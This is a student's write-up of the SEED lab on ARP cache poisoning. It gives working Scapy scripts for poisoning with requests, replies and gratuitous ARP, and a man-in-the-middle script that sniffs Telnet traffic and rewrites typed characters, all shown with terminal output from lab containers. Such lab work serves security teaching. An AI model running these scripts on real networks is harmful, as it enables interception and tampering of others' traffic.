# ARP Cache Poisoning Attack Lab

## Fei Guo, July 7, 2022

Lab Spec: https://seedsecuritylabs.org/Labs_20.04/Networking/ARP_Attack/

### ARP Cache Poisoning 

Here we try to send a forged ARP request to VICTIM to fool it into updating its ARP entry for TARGET IP and map it to a fake MAC. There are three ways to achieve this.

Method 1 - with ARP Request:

Send a forged request on Attacker Machine:
```python
#!/usr/bin/env python3
from scapy.all import *
FAKE_MAC = 'aa:bb:cc:dd:ee:ff'
TARGET_IP = "10.9.0.6" 
VICTIM_MAC = '02:42:0a:09:00:05' 
VICTIM_IP = "10.9.0.5" 
E = Ether(src=FAKE_MAC, dst=VICTIM_MAC)
A = ARP(psrc=TARGET_IP, hwsrc=FAKE_MAC, pdst=VICTIM_IP)
A.op = 1     # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt)
```

Check it on VICTIM:
```bash
root@0dbfcd70fcd9:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   aa:bb:cc:dd:ee:ff   C                     eth0
```

Method 2 - With ARP reply:

```python
#!/usr/bin/env python3
from scapy.all import *
FAKE_MAC = 'aa:bb:cc:dd:ee:ff'
TARGET_IP = "10.9.0.6" 
VICTIM_MAC = '02:42:0a:09:00:05' 
VICTIM_IP = "10.9.0.5" 
E = Ether(src=FAKE_MAC, dst=VICTIM_MAC)
A = ARP(psrc=TARGET_IP, hwsrc=FAKE_MAC, pdst=VICTIM_IP)
A.op = 2     # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt)
```
We delete the arp entry for 10.9.0.6 and then send the above reply
```
root@0dbfcd70fcd9:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   aa:bb:cc:dd:ee:ff   C                     eth0
root@0dbfcd70fcd9:/# arp -d 10.9.0.6
<after the spoofed reply>
root@0dbfcd70fcd9:/# arp -n
```
So it doesn't update / add the fake mapping. But if we first add this entry by pinging the target, we do see the fake mac.
```bash
root@0dbfcd70fcd9:/# ping 10.9.0.6
PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.105 ms
^C
--- 10.9.0.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.105/0.105/0.105/0.000 ms
root@0dbfcd70fcd9:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
root@0dbfcd70fcd9:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   aa:bb:cc:dd:ee:ff   C                     eth0
```


Method 3 - With Gratuitous Message:

```python
#!/usr/bin/env python3
from scapy.all import *
BROADCAST = 'ff:ff:ff:ff:ff:ff'
FAKE_MAC = 'aa:bb:cc:dd:ee:ff'
TARGET_IP = "10.9.0.6" 
E = Ether(src=FAKE_MAC, dst=BROADCAST)
A = ARP(psrc=TARGET_IP, hwsrc=FAKE_MAC, hwdst=BROADCAST, pdst=TARGET_IP)
A.op = 1     # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt)
```
And VICTIM happily updates its ARP entry.
```bash
root@0dbfcd70fcd9:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   aa:bb:cc:dd:ee:ff   C                     eth0
```

An interesting side note is, with this fake mac address, we can't ping 10.9.0.6 from 10.9.0.5 for a short while, but it won't take failure for an answer and it will retry. With the broadcast property of the arp request, it will very soon get a correct reply from 10.9.0.6 and update its arp entry to the correct one. 

### Man in the middle Attack on Telnet

First, we fool host A and B to believing that Attacker mac is the mac they want to talk with.
```python
#!/usr/bin/env python3
from scapy.all import *
import time
while True:
    FAKE_MAC = '02:42:0a:09:00:69'
    # To host A
    E = Ether(src=FAKE_MAC, dst='02:42:0a:09:00:05' )
    A = ARP(psrc="10.9.0.6" , hwsrc=FAKE_MAC, pdst="10.9.0.5" )
    A.op = 1     # 1 for ARP request; 2 for ARP reply
    pkt = E/A
    sendp(pkt)
    # To host B
    E = Ether(src=FAKE_MAC, dst="02:42:0a:09:00:06")
    A = ARP(psrc="10.9.0.5" , hwsrc=FAKE_MAC, pdst="10.9.0.6")
    A.op = 1     # 1 for ARP request; 2 for ARP reply
    pkt = E/A
    sendp(pkt)
    time.sleep(5)
```
At this time, if we ping B from host A , we get duplicate echo replies:
```
root@0dbfcd70fcd9:/# ping 10.9.0.6
PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
64 bytes from 10.9.0.6: icmp_seq=1 ttl=63 time=0.119 ms
From 10.9.0.105: icmp_seq=2 Redirect Host(New nexthop: 10.9.0.6)
64 bytes from 10.9.0.6: icmp_seq=2 ttl=63 time=0.096 ms
From 10.9.0.105: icmp_seq=3 Redirect Host(New nexthop: 10.9.0.6)
64 bytes from 10.9.0.6: icmp_seq=3 ttl=63 time=0.098 ms
```
This is because Attacker now plays the role of a router. When attacker sees a request with an IP destination not for itself, even though it receives the packet (because it has the right MAC), it will deliver the packet to the next hop (the one with the right IP).

But if we disable forwarding by:
`sysctl net.ipv4.ip_forward=0`

We can only see some intermittent echo replies. This is because the wrong MAC lead to no results, so Ping will initiate BROADCAST arp request and asks "who has "10.9.0.6", which 10.9.0.6 will answer, thus updating the arp entry in 10.9.0.5. This can be confirmed in Wireshark.

Now, to launch the Man-in-the-Middle attack, we poison the ARP entries in A and B, and then telnet from A to B. After this, we disable the 
`sysctl net.ipv4.ip_forward=0` on Attacker machine. Then we run this script:

```python
#!/usr/bin/env python3
from scapy.all import *
import re
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        #    because our modification will make them invalid.
        #    Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load  # The original payload data
            # NOTE: we can only replace byte by byte, no adding nor deleting, otherwise invalid tcp packet!
            newdata = bytes([ord("A") if chr(byte).isalpha() else byte for byte in data])
            print("new data", newdata)
            send(newpkt/newdata)
        else:
            send(newpkt)
            ################################################################
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

f = 'tcp and not ether src host 02:42:0a:09:00:69' # if it's from Attacker's MAC, don't capture
pkt = sniff(filter=f, prn=spoof_pkt)
```

In this way, A can still talk to B, but the characters the user types on A will be tampered and become all 'A's.


